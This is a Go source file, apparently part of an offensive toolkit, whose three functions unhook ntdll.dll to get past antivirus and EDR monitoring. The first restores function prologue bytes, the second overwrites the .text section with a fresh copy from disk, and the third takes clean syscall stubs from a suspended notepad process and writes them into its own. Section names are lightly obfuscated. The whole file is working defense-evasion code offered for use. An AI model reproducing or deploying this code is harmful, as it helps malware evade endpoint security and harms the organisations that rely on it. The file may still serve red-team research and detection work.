package core

/*

References:
https://github.com/RedLectroid/APIunhooker
https://www.ired.team/offensive-security/defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis

*/

import (
  "time"
  "bytes"
  "strings"
  "errors"
  "unsafe"
  "syscall"
  "io/ioutil"

  "golang.org/x/sys/windows"

  "github.com/Binject/debug/pe"
)

// This function unhooks given function of especified dll (NtCreateThread and C:\\Windows\\System32\\ntdll.dll)
func ClassicUnhook(funcname string, dllpath string) (error) {
  // Load DLL APIs
  k32 := syscall.NewLazyDLL("kernel32.dll")
  getCurrentProcess := k32.NewProc("GetCurrentProcess")
  getModuleHandle := k32.NewProc("GetModuleHandleW")
  getProcAddress := k32.NewProc("GetProcAddress")
  writeProcessMemory := k32.NewProc("WriteProcessMemory")

  var assembly_bytes []byte

  // should be full path: C:\\Windows\\System32\\ntdll.dll
  ntdll_lib, _ := syscall.LoadLibrary(dllpath)
  defer syscall.FreeLibrary(ntdll_lib)

  procAddr, _ := syscall.GetProcAddress(ntdll_lib, funcname)

  ptr_bytes := (*[1 << 30]byte)(unsafe.Pointer(procAddr))
  funcBytes := ptr_bytes[:5:5]

  for i := 0; i < 5; i++ {
    assembly_bytes = append(assembly_bytes, funcBytes[i])
  }

  ownHandle, _, _ := getCurrentProcess.Call()

  // Convert dll name to pointer
  ntdll_ptr, _ := windows.UTF16PtrFromString(strings.Split(dllpath, "\\")[3])
  moduleHandle, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(ntdll_ptr)))

  func_ptr, _ := windows.UTF16PtrFromString(funcname)
  procAddr2, _, _ := getProcAddress.Call(moduleHandle, uintptr(unsafe.Pointer(func_ptr)))

  // Overwrite address with original function bytes
  writeProcessMemory.Call(ownHandle, procAddr2, uintptr(unsafe.Pointer(&assembly_bytes[0])), 5, uintptr(0))

  return nil
}

func FullUnhook(dllpath string) (error) {

  ntdll := syscall.NewLazyDLL("ntdll.dll")
  protectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

  dll_f, err := ioutil.ReadFile(dllpath)
  if err != nil {
    return err
  }

  pe_f, err := pe.Open(dllpath)
  if err != nil {
    return err
  }
  defer pe_f.Close()
  
  text_section := pe_f.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
  dllBytes := dll_f[text_section.Offset:text_section.Size]

  dll_load, err := windows.LoadDLL(dllpath)
  if err != nil {
    return err
  }
  
  handle := dll_load.Handle
  dllBase := uintptr(handle)
  dllOffset := uint(dllBase) + uint(text_section.VirtualAddress)
  
  var oldfartcodeperms uintptr
  
  regionsize := uintptr(len(dllBytes))
  handlez := uintptr(0xffffffffffffffff)

  runfunc, _, _ := protectVirtualMemory.Call(
    handlez,
    uintptr(unsafe.Pointer(&dllOffset)),
    uintptr(unsafe.Pointer(&regionsize)),
    syscall.PAGE_EXECUTE_READWRITE,
    uintptr(unsafe.Pointer(&oldfartcodeperms)),
  )

  for i := 0; i < len(dllBytes); i++ {
    loc := uintptr(dllOffset + uint(i))
    mem := (*[1]byte)(unsafe.Pointer(loc))
    (*mem)[0] = dllBytes[i]
  }

  runfunc, _, _ = protectVirtualMemory.Call(
    handlez,
    uintptr(unsafe.Pointer(&dllOffset)),
    uintptr(unsafe.Pointer(&regionsize)),
    oldfartcodeperms,
    uintptr(unsafe.Pointer(&oldfartcodeperms)),
  )

  if runfunc != 0 {
    return errors.New("an error has ocurred")
  }

  return nil
}

func PerunsUnhook() (error) {
  procWriteProcessMemory := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")

  var si syscall.StartupInfo
  var pi syscall.ProcessInformation
  si.Cb = uint32(unsafe.Sizeof(syscall.StartupInfo{}))
  
  cmdline, err := syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
  if err != nil {
    return err
  }

  err = syscall.CreateProcess(
    nil,
    cmdline,
    nil,
    nil,
    false,
    windows.CREATE_NEW_CONSOLE | windows.CREATE_SUSPENDED,
    nil,
    nil,
    &si,
    &pi,
  )

  if err != nil {
    return err
  }

  time.Sleep(800 * time.Millisecond)
  
  ntd, _ := inMemLoads(string([]byte{'n', 't', 'd', 'l', 'l'}))
  if (ntd == 0) {
    return errors.New("an error has ocurred while loading ntdll.dll")
  }
  addrMod := ntd

  ntHeader := (*IMAGE_NT_HEADER)(unsafe.Pointer(addrMod + uintptr((*IMAGE_DOS_HEADER)(unsafe.Pointer(addrMod)).E_lfanew)))
  if (ntHeader == nil) {
    return errors.New("an error has ocurred while getting nt header")
  }

  time.Sleep(50 * time.Millisecond)

  modSize := ntHeader.OptionalHeader.SizeOfImage
  if (modSize == 0) {
    return errors.New("an error has ocurred while getting nt header size")
  }

  cache := make([]byte, modSize)
  var lpNumberOfBytesRead uintptr

  err = windows.ReadProcessMemory(
    windows.Handle(uintptr(pi.Process)), 
    addrMod,
    &cache[0],
    uintptr(modSize),
    &lpNumberOfBytesRead,
  )

  if err != nil {
    return err
  }

  e := syscall.TerminateProcess(pi.Process, 0)
  if e != nil {
    return e
  }

  time.Sleep(50 * time.Millisecond)

  pe0, err := pe.NewFileFromMemory(bytes.NewReader(cache))
  if err != nil {
    return err
  }

  secHdr := pe0.Section(string([]byte{'.', 't', 'e', 'x', 't'}))

  startOffset := findFirstSyscallOffset(cache, int(secHdr.VirtualSize), addrMod)
  endOffset := findLastSyscallOffset(cache, int(secHdr.VirtualSize), addrMod)
  cleanSyscalls := cache[startOffset:endOffset]

  /*ZwWriteVirtualMemory, err := GetSysId("ZwWriteVirtualMemory")
  if err != nil {
    return err
  }*/

  // Don't handle error as it may return false errors
  procWriteProcessMemory.Call(
    uintptr(0xffffffffffffffff),
    uintptr(addrMod + uintptr(startOffset)),
    uintptr(unsafe.Pointer(&cleanSyscalls[0])),
    uintptr(len(cleanSyscalls)),
    0,
  )

  return nil
}


